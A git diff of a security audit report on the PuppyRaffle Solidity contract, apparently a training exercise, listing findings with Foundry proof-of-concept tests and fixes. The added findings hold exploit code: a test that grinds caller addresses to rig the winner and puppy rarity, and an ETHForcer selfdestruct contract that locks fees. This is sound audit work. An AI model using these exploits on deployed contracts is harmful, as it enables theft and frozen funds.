@@ -98,7 +98,6 @@ Logs:
 ```
 
 3. Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/3.x/api/utils#EnumerableSet).
-
 ___
 ### [H-2] External call made before state change in `refund` function, an open invitation for a reentrancy attack
 
@@ -241,94 +240,18 @@ Logs:
      }
 ```
 ___
-### [I-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for inactive players, making "not found" look exactly like the player at index 0
+### [H-3] Weak randomness in `PuppyRaffle::selectWinner` function, an attacker can grind the block values and hand-pick the winner and the puppy rarity
 
 **Description::**
-The `getActivePlayerIndex` function loops over the `players` array and returns the index when it finds the player. But when the player is NOT in the raffle, it falls through the loop and returns `0`. Since `0` is also a completely valid index (the first player), a caller has no way to tell "this player sits at index 0" apart from "this player never entered the raffle".
+`selectWinner` derives the winner from `keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty)) % players.length`, and derives the puppy `rarity` from the same kind of hash. None of those inputs are actually random, since `msg.sender` is just whoever calls the function and the block values are chosen by the block producer, so an attacker can grind them and hand-pick both the winner and the rarity.
 
 **Impact::**
-Inactive players get reported as index 0, so any contract or frontend trusting this return value can act on the wrong player.
+An attacker who can influence the block values can guarantee that they win the raffle and get the puppy rarity they want
 
 **Proof of Concept::**
-Check the `test_GetActivePlayerIndex_AUDIT` test in the `PuppyRaffleTest.t.sol` file:
+Check the `test_WeakRandomness_AUDIT` and `test_WeakRandomnessRarity_AUDIT` tests in the `PuppyRaffleTest.t.sol` file:
 <details>
-<summary>Full Code</summary>
-
-```javascript
-    function test_GetActivePlayerIndex_AUDIT() public {
-        address[] memory players = new address[](1);
-        players[0] = playerOne;
-        puppyRaffle.enterRaffle{value: entranceFee}(players);
-
-        address notAPlayer = makeAddr("notAPlayer");
-
-        uint256 indexOfRealPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
-        uint256 indexOfInactivePlayer = puppyRaffle.getActivePlayerIndex(
-            notAPlayer
-        );
-
-        console2.log("Index of playerOne:", indexOfRealPlayer);
-        console2.log("Index of inactive player:", indexOfInactivePlayer);
-
-        // both return 0, so they are indistinguishable
-        assertEq(indexOfRealPlayer, indexOfInactivePlayer);
-        assertEq(puppyRaffle.players(0), playerOne);
-    }
-```
-
-</details>
-You can run it via
-
-```bash
-forge test --mt test_GetActivePlayerIndex_AUDIT -vvv
-```
-and you will see something like this:
-
-```text
-Logs:
-  Index of playerOne: 0
-  Index of inactive player: 0
-```
-The player who entered and the player who never entered both come back as `0`.
-
-**Recommended Solution::**
-1. Revert when the player cannot be found, so the failure is explicit instead of silently looking like index 0:
-
-```diff
-     function getActivePlayerIndex(
-         address player
-     ) external view returns (uint256) {
-         for (uint256 i = 0; i < players.length; i++) {
-             if (players[i] == player) {
-                 return i;
-             }
-         }
--        return 0;
-+        revert("PuppyRaffle: Player is not active");
-     }
-```
-
-2. Or return a sentinel value that can never be a valid array index, and let the caller handle it:
-
-```diff
--        return 0;
-+        // type(uint256).max is never a valid index
-+        return type(uint256).max;
-```
-
-___
-### [H-3] Weak randomness in `PuppyRaffle::selectWinner` function, an attacker can grind the block values and hand-pick the winner
-
-**Description::**
-`selectWinner` picks the winner with `keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty)) % players.length`, and uses the same kind of expression again to decide the puppy `rarity`. None of those inputs are actually random: `msg.sender` is just whoever calls the function, and `block.timestamp` and `block.difficulty` are chosen by the block producer. Every input is public and known before the draw, so the winner can be calculated in advance, and a block producer can grind the values until the result favours them.
-
-**Impact::**
-An attacker who can influence the block values can guarantee that they win the raffle
-
-**Proof of Concept::**
-Check the `test_WeakRandomness_AUDIT` test in the `PuppyRaffleTest.t.sol` file:
-<details>
-<summary>Full Code</summary>
+<summary>Full Code (winner)</summary>
 
 ```javascript
     function test_WeakRandomness_AUDIT() public {
@@ -385,21 +308,216 @@ Logs:
 ```
 The attacker simply tries timestamps until the "random" formula lands on their own index, then triggers the draw at that exact timestamp.
 
+<details>
+<summary>Full Code (rarity)</summary>
+
+```javascript
+    // THIS TEST WAS WRITTEN BY DEEPSEEK HARNESS SO I CAN UNDERSTAND DEEPLY MYSELF
+    function test_WeakRandomnessRarity_AUDIT() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        // the raffle has to be over before the draw, so this is the timestamp
+        // the attacker will be executing at
+        uint256 drawTime = block.timestamp + duration + 1;
+        vm.warp(drawTime);
+        vm.roll(block.number + 1);
+
+        // the attacker does not even have to be a player, they only have to be
+        // the caller, because msg.sender sits inside both hashes
+        address attacker;
+        uint256 winningIndex;
+        uint256 chosenRarity;
+
+        // grind over caller addresses until one of them picks playerFour as the
+        // winner AND hands them a legendary puppy
+        for (uint256 i = 0; i < 5000; i++) {
+            address candidate = address(uint160(1000 + i));
+
+            // these are the same two expressions used inside selectWinner()
+            uint256 index = uint256(
+                keccak256(
+                    abi.encodePacked(candidate, drawTime, block.difficulty)
+                )
+            ) % players.length;
+            uint256 rarity = uint256(
+                keccak256(abi.encodePacked(candidate, block.difficulty))
+            ) % 100;
+
+            // index 3 is playerFour, rarity 96-99 is LEGENDARY_RARITY
+            if (index == 3 && rarity > 95) {
+                attacker = candidate;
+                winningIndex = index;
+                chosenRarity = rarity;
+                break;
+            }
+        }
+
+        assertTrue(
+            attacker != address(0),
+            "attacker found a caller for winner + legendary"
+        );
+
+        vm.prank(attacker);
+        puppyRaffle.selectWinner();
+
+        console2.log("caller address picked by attacker:", attacker);
+        console2.log("winning index:", winningIndex);
+        console2.log("rarity rolled by attacker:", chosenRarity);
+        console2.log(
+            "rarity stored on the minted token:",
+            puppyRaffle.tokenIdToRarity(0)
+        );
+
+        assertEq(puppyRaffle.previousWinner(), playerFour);
+        assertEq(puppyRaffle.tokenIdToRarity(0), 5);
+    }
+```
+
+</details>
+You can run it via
+
+```bash
+forge test --mt test_WeakRandomnessRarity_AUDIT -vvv
+```
+and you will see something like this:
+
+```text
+Logs:
+  caller address picked by attacker: 0x000000000000000000000000000000000000041c
+  winning index: 3
+  rarity rolled by attacker: 97
+  rarity stored on the minted token: 5
+```
+Here the attacker does not even have to be a player, they only have to be the caller, and they grind caller addresses until one of them wins the raffle for them and rolls a legendary puppy.
+
 **Recommended Solution::**
 1. Use a verifiable randomness oracle instead of block values. [Chainlink VRF](https://docs.chain.link/vrf) generates randomness on-chain that cannot be predicted or manipulated, which is the standard fix for this class of bug.
 
 2. Stop using `block.timestamp` and `block.difficulty` as randomness sources in the first place. Both are chosen by the block producer, which is exactly why they can be ground until the outcome is favourable.
 ___
-### [Q-1] Is the 80/20 winner-to-fee split in `PuppyRaffle::selectWinner` the intended design?
+### [H-4] Mishandling of ETH in `PuppyRaffle::withdrawFees` function, selfdestruct can break the strict balance check and lock the fees forever
 
 **Description::**
-`selectWinner` splits the funds collected from the raffle into a `prizePool` of 80%, which is sent to the winner, and a `fee` of 20%, which is kept for the `feeAddress`:
+`withdrawFees` only works while `address(this).balance == uint256(totalFees)`, and anyone can break that equality by forcing ETH in with `selfdestruct`, since the contract has no `receive` or `fallback`.
+
+**Impact::**
+Anyone can permanently block fee withdrawals with a single selfdestruct
+
+**Proof of Concept::**
+Check the `test_MishandlingOfETH_AUDIT` test & `ETHForcer` contract in the `PuppyRaffleTest.t.sol` file:
+<details>
+<summary>Full Test Code</summary>
 
 ```javascript
-uint256 prizePool = (totalAmountCollected * 80) / 100;
-uint256 fee = (totalAmountCollected * 20) / 100;
+    function test_MishandlingOfETH_AUDIT() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+
+        // after a normal draw the contract holds exactly the recorded fees,
+        // which is the only state where withdrawFees is allowed to run
+        console2.log("totalFees recorded:", uint256(puppyRaffle.totalFees()));
+        console2.log("raffle balance:", address(puppyRaffle).balance);
+        assertEq(
+            address(puppyRaffle).balance,
+            uint256(puppyRaffle.totalFees())
+        );
+
+        // the contract has no receive or fallback, so the only way ETH gets in
+        // is by force feeding it with selfdestruct
+        ETHForcer forcer = new ETHForcer{value: 1 ether}();
+        forcer.attack(payable(address(puppyRaffle)));
+
+        console2.log(
+            "raffle balance after force feed:",
+            address(puppyRaffle).balance
+        );
+
+        // the equality can never hold again, so the fees are stuck forever
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+
+        assertGt(
+            address(puppyRaffle).balance,
+            uint256(puppyRaffle.totalFees())
+        );
+        console2.log("feeAddress balance:", address(feeAddress).balance);
+        assertEq(address(feeAddress).balance, 0);
+    }
 ```
-The contract's own natspec only says that the owner "will set a feeAddress to take a cut of the `value`" and never states what that cut should be. It is unclear whether the 80/20 numbers are the intended design or just placeholder values, so please confirm the intended split.
+
+</details>
+The attacker contract:
+<details>
+<summary>Attacker Contract</summary>
+
+```javascript
+contract ETHForcer {
+    constructor() payable {}
+
+    // selfdestruct pushes the whole balance into the target, and the target
+    // cannot refuse it, even without a receive or fallback function
+    function attack(address payable target) external {
+        selfdestruct(target);
+    }
+}
+```
+
+</details>
+You can run it via
+
+```bash
+forge test --mt test_MishandlingOfETH_AUDIT -vvv
+```
+and you will see something like this:
+
+```text
+Logs:
+  totalFees recorded: 800000000000000000
+  raffle balance: 800000000000000000
+  raffle balance after force feed: 1800000000000000000
+  feeAddress balance: 0
+```
+The raffle starts out holding exactly the fees it owes, one selfdestruct pushes the balance above `totalFees`, and from then on `withdrawFees` reverts even though no players are active.
+
+**Recommended Solution::**
+1. Use a `>=` check instead of `==`, since the contract only needs to hold *at least* the fees it owes:
+
+```diff
+-        address(this).balance == uint256(totalFees),
++        address(this).balance >= uint256(totalFees),
+```
+
+2. Never use the contract balance for accounting, since ETH can always be forced in. Track the players' funds in their own variable and check that instead:
+
+```diff
++    uint256 public playerFunds;
+
+     // enterRaffle
++    playerFunds += msg.value;
+
+     // refund, when a player takes their fee back
++    playerFunds -= entranceFee;
+
+     // selectWinner, after the prize and the fee are accounted for
++    playerFunds = 0;
+
+     // withdrawFees
+-        address(this).balance == uint256(totalFees),
++        playerFunds == 0,
+```
 ___
 ### [M-1] Arithmetic overflow in `PuppyRaffle::selectWinner`, `totalFees` wraps around because the contract runs Solidity 0.7.6
 
@@ -575,3 +693,311 @@ A 20 ETH fee gets recorded as about 1.55 ETH, with no revert and no warning.
 +        totalFees = totalFees + fee.toUint64();
 ```
 Note that this turns silent corruption into a revert, so the raffle would stop working once the fee passes the limit. Widening the type is still the real fix.
+___
+### [L-1] Loop based membership check in `PuppyRaffle::_isActivePlayer` function, it should use a mapping instead of iterating the array
+
+**Description::**
+`_isActivePlayer` scans the whole `players` array to answer a yes or no question. This is the same unbounded loop pattern as `H-1`, and it gets more expensive with every player that enters.
+
+**Impact::**
+No impact while the function is unused, but it would be a gas problem the moment it is called.
+
+**Proof of Concept::**
+Check the `test_LoopBasedMembershipCheck_AUDIT` test in the `PuppyRaffleTest.t.sol` file. It measures `getActivePlayerIndex`, since `_isActivePlayer` is internal and never called, and the two loops are identical:
+<details>
+<summary>Full Test Code</summary>
+
+```javascript
+    function test_LoopBasedMembershipCheck_AUDIT() public {
+        // 10 players, and we look up the last one so the loop runs fully
+        address[] memory tenPlayers = new address[](10);
+        for (uint256 i = 0; i < 10; i++) {
+            tenPlayers[i] = address(uint160(1000 + i));
+        }
+        puppyRaffle.enterRaffle{value: entranceFee * 10}(tenPlayers);
+
+        uint256 gasBefore = gasleft();
+        puppyRaffle.getActivePlayerIndex(tenPlayers[9]);
+        uint256 gasWithTenPlayers = gasBefore - gasleft();
+
+        // 90 more players, 100 in total
+        address[] memory morePlayers = new address[](90);
+        for (uint256 i = 0; i < 90; i++) {
+            morePlayers[i] = address(uint160(2000 + i));
+        }
+        puppyRaffle.enterRaffle{value: entranceFee * 90}(morePlayers);
+
+        gasBefore = gasleft();
+        puppyRaffle.getActivePlayerIndex(morePlayers[89]);
+        uint256 gasWithHundredPlayers = gasBefore - gasleft();
+
+        console2.log("gas with 10 players:", gasWithTenPlayers);
+        console2.log("gas with 100 players:", gasWithHundredPlayers);
+        console2.log(
+            "Gas Difference:::::",
+            gasWithHundredPlayers - gasWithTenPlayers
+        );
+
+        // the same lookup costs more as the array grows
+        assert(gasWithHundredPlayers > gasWithTenPlayers);
+    }
+```
+
+</details>
+You can run it via
+
+```bash
+forge test --mt test_LoopBasedMembershipCheck_AUDIT -vvv
+```
+and you will see something like this:
+
+```text
+Logs:
+  gas with 10 players: 28544
+  gas with 100 players: 255164
+  Gas Difference::::: 226620
+```
+The same lookup costs about 9x more gas with 100 players, since every call walks the whole array.
+
+**Recommended Solution::**
+1. If the function is kept, track membership with a mapping that is written on entry and cleared on refund, instead of looping:
+
+```diff
++    mapping(address => bool) public isActivePlayer;
+...
++        isActivePlayer[newPlayers[i]] = true;
+...
+     function _isActivePlayer() internal view returns (bool) {
+-        for (uint256 i = 0; i < players.length; i++) {
+-            if (players[i] == msg.sender) {
+-                return true;
+-            }
+-        }
+-        return false;
++        return isActivePlayer[msg.sender];
+     }
+```
+
+2. Otherwise remove the function, as recommended in `I-9`.
+___
+### [Q-1] Missing check for an empty players array in `PuppyRaffle::enterRaffle` function, can lead to a 0 ETH call that emits `RaffleEnter` and wastes gas
+
+**Description::**
+`enterRaffle` only checks that the value sent matches the entrance fee, so an empty array means `0 == 0` and the call goes through without adding a single player:
+
+```javascript
+require(
+    msg.value == entranceFee * newPlayers.length,
+    "PuppyRaffle: Must send enough to enter raffle"
+);
+```
+The contract still emits `RaffleEnter` with an empty array, paying gas for a call that does nothing. Is this intended, or should a call that adds no players be rejected?
+___
+### [I-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for inactive players, making "not found" look exactly like the player at index 0
+
+**Description::**
+The `getActivePlayerIndex` function loops over the `players` array and returns the index when it finds the player. But when the player is NOT in the raffle, it falls through the loop and returns `0`. Since `0` is also a completely valid index (the first player), a caller has no way to tell "this player sits at index 0" apart from "this player never entered the raffle".
+
+**Impact::**
+Inactive players get reported as index 0, so any contract or frontend trusting this return value can act on the wrong player.
+
+**Proof of Concept::**
+Check the `test_GetActivePlayerIndex_AUDIT` test in the `PuppyRaffleTest.t.sol` file:
+<details>
+<summary>Full Code</summary>
+
+```javascript
+    function test_GetActivePlayerIndex_AUDIT() public {
+        address[] memory players = new address[](1);
+        players[0] = playerOne;
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+
+        address notAPlayer = makeAddr("notAPlayer");
+
+        uint256 indexOfRealPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
+        uint256 indexOfInactivePlayer = puppyRaffle.getActivePlayerIndex(
+            notAPlayer
+        );
+
+        console2.log("Index of playerOne:", indexOfRealPlayer);
+        console2.log("Index of inactive player:", indexOfInactivePlayer);
+
+        // both return 0, so they are indistinguishable
+        assertEq(indexOfRealPlayer, indexOfInactivePlayer);
+        assertEq(puppyRaffle.players(0), playerOne);
+    }
+```
+
+</details>
+You can run it via
+
+```bash
+forge test --mt test_GetActivePlayerIndex_AUDIT -vvv
+```
+and you will see something like this:
+
+```text
+Logs:
+  Index of playerOne: 0
+  Index of inactive player: 0
+```
+The player who entered and the player who never entered both come back as `0`.
+
+**Recommended Solution::**
+1. Revert when the player cannot be found, so the failure is explicit instead of silently looking like index 0:
+
+```diff
+     function getActivePlayerIndex(
+         address player
+     ) external view returns (uint256) {
+         for (uint256 i = 0; i < players.length; i++) {
+             if (players[i] == player) {
+                 return i;
+             }
+         }
+-        return 0;
++        revert("PuppyRaffle: Player is not active");
+     }
+```
+
+2. Or return a sentinel value that can never be a valid array index, and let the caller handle it:
+
+```diff
+-        return 0;
++        // type(uint256).max is never a valid index
++        return type(uint256).max;
+```
+___
+### [I-2] Floating and outdated pragma in `PuppyRaffle` contract, the old compiler version misses built-in overflow checks and other fixes
+
+**Description::**
+The contract starts with `pragma solidity ^0.7.6`, which is both floating and several years old. A floating pragma lets the contract be compiled with any `0.7.x` version, and `0.7.6` has no built-in overflow checks, which is the root of `M-1`.
+
+**Impact::**
+No impact on its own, but the old version is what makes the overflow in `M-1` possible in the first place.
+
+**Recommended Solution::**
+1. Pin the pragma to the exact version the code was tested with, instead of allowing a range:
+
+```diff
+- pragma solidity ^0.7.6;
++ pragma solidity 0.7.6;
+```
+
+2. Better, upgrade to `0.8.x`, where `+`, `-` and `*` revert on overflow automatically:
+
+```diff
+- pragma solidity ^0.7.6;
++ pragma solidity 0.8.20;
+```
+___
+### [I-3] Non-constant image URI variables in `PuppyRaffle` contract, they never change and only cost gas at deployment
+
+**Description::**
+`commonImageUri`, `rareImageUri` and `legendaryImageUri` are regular storage variables holding `ipfs://` strings, and they are only read once in the constructor to fill up `rarityToUri`. Marking them `constant` removes those storage writes and reads completely.
+
+**Impact::**
+No security impact, just wasted gas at deployment and a false signal that these values are meant to change.
+
+**Recommended Solution::**
+
+```diff
+-    string private commonImageUri =
++    string private constant commonImageUri =
+         "ipfs://QmSsYRx3LpDAb1GZQm7zZ1AuHZjfbPkD6J7s9r41xu1mf8";
+```
+The same applies to `rareImageUri` and `legendaryImageUri`.
+___
+### [I-4] Missing zero value checks on the constructor parameters in `PuppyRaffle` constructor, a misconfigured deployment can be impossible to fix
+
+**Description::**
+`entranceFee`, `feeAddress` and `raffleDuration` are assigned in the constructor without any validation. Because `entranceFee` is `immutable`, a fee of `0` would make every entry free for the lifetime of the contract.
+
+**Impact::**
+A zero entrance fee can never be corrected, and a zero `feeAddress` sends the fees to `address(0)` until the owner notices.
+
+**Recommended Solution::**
+
+```diff
+     ) ERC721("Puppy Raffle", "PR") {
++        require(_entranceFee > 0, "PuppyRaffle: Entrance fee cannot be zero");
++        require(_feeAddress != address(0), "PuppyRaffle: Fee address cannot be zero");
++        require(_raffleDuration > 0, "PuppyRaffle: Duration cannot be zero");
+         entranceFee = _entranceFee;
+```
+___
+### [I-5] No early return for an empty players array in `PuppyRaffle::enterRaffle` function, a call that adds nobody still loops and emits `RaffleEnter`
+
+**Description::**
+When `newPlayers` is empty, `msg.value == entranceFee * newPlayers.length` becomes `0 == 0`, so the call goes through without adding a player. The duplicate loop still runs over the existing players and the event is emitted with an empty array, all for a call that does nothing.
+
+**Impact::**
+No security impact, the caller only wastes their own gas.
+
+**Recommended Solution::**
+1. Same fix as `Q-1`, reject calls that add no players so the loop and the event are skipped.
+___
+### [I-6] Storage array length is read on every iteration in `PuppyRaffle::getActivePlayerIndex` function, caching it in memory saves gas
+
+**Description::**
+The loop condition evaluates `players.length` on each iteration, which is a storage read every time. Copying the length into a local variable once removes all the repeated `SLOAD`s.
+
+**Impact::**
+No security impact, only gas. It is a `view` function so callers pay nothing, but the same pattern sits in the hot path of `enterRaffle` and `selectWinner`.
+
+**Recommended Solution::**
+
+```diff
++        uint256 playersLength = players.length;
+-        for (uint256 i = 0; i < players.length; i++) {
++        for (uint256 i = 0; i < playersLength; i++) {
+```
+___
+### [I-7] Magic numbers for the prize and fee split in `PuppyRaffle::selectWinner` function, the 80/20 values should be named constants
+
+**Description::**
+`prizePool` and `fee` are calculated with the hardcoded values `80`, `20` and `100`. Naming them makes the intended split explicit, and the two percentages must always add up to the denominator, which is easy to break silently.
+
+**Impact::**
+No security impact, only readability and a higher chance of a typo going unnoticed in review.
+
+**Recommended Solution::**
+
+```diff
++    uint256 public constant PRIZE_PERCENTAGE = 80;
++    uint256 public constant FEE_PERCENTAGE = 20;
++    uint256 public constant PERCENTAGE_DENOMINATOR = 100;
+...
+-        uint256 prizePool = (totalAmountCollected * 80) / 100;
+-        uint256 fee = (totalAmountCollected * 20) / 100;
++        uint256 prizePool = (totalAmountCollected * PRIZE_PERCENTAGE) / PERCENTAGE_DENOMINATOR;
++        uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / PERCENTAGE_DENOMINATOR;
+```
+___
+### [I-8] Missing zero address check in `PuppyRaffle::changeFeeAddress` function, the owner can accidentally send the fees to `address(0)`
+
+**Description::**
+`changeFeeAddress` accepts any address, including `address(0)`. Since `withdrawFees` sends the whole fee balance to `feeAddress`, a zero address burns those funds for good.
+
+**Impact::**
+All future fees can be lost through a single owner mistake.
+
+**Recommended Solution::**
+
+```diff
+     function changeFeeAddress(address newFeeAddress) external onlyOwner {
++        require(newFeeAddress != address(0), "PuppyRaffle: Fee address cannot be zero");
+         feeAddress = newFeeAddress;
+```
+___
+### [I-9] Unused `_isActivePlayer` function in `PuppyRaffle` contract, dead code that only adds review surface
+
+**Description::**
+`_isActivePlayer` is declared `internal` but is never called anywhere in the contract. Dead code still has to be reviewed and maintained, and it hides the fact that the membership check was never wired into `refund` or `selectWinner`.
+
+**Impact::**
+No direct security impact, but it is unnecessary code that misleads future readers into thinking membership is enforced.
+
+**Recommended Solution::**
+1. Remove the function, since nothing calls it.
+2. If it is meant to be used, wire it into the functions that need a membership check, and see `L-1` for the right way to implement it.
